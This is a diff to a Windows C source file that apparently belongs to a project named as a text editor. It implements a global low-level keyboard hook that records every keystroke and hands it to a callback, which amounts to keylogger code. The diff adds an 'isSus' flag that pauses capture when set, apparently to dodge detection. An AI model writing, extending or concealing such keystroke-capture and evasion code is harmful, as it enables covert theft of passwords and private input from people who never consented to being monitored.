@@ -1,7 +1,9 @@
 #include "texteditor.h"
 #include <Windows.h>
+#include <stdbool.h>
 
 int (*callbackLocal)(DWORD d, char c) = NULL;
+bool *isSus;
 
 struct unicodethings
 {
@@ -32,6 +34,9 @@ void GetUnicode(struct unicodethings u)
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
+    if (*isSus)
+        return CallNextHookEx(NULL, nCode, wParam, lParam);
+
     if (nCode == HC_ACTION)
     {
         switch (wParam)
@@ -48,7 +53,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
             HANDLE h = CreateThread(NULL, 0, &GetUnicode, &ut, 0, NULL);
             WaitForSingleObject(h, 100);
             CloseHandle(h);
-            
+
             callbackLocal(keycode, ut.c);
 
         case WM_SYSKEYDOWN:
@@ -64,9 +69,10 @@ char GetKeyFromUINT(UINT key)
     return (char)MapVirtualKeyA((u_int)key, (u_int)2);
 }
 
-void activateKeyhook(int (*callback)(DWORD, char))
+void activateKeyhook(int (*callback)(DWORD, char), bool *iS)
 {
     callbackLocal = callback;
+    isSus = iS;
     HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
 
     MSG msg;
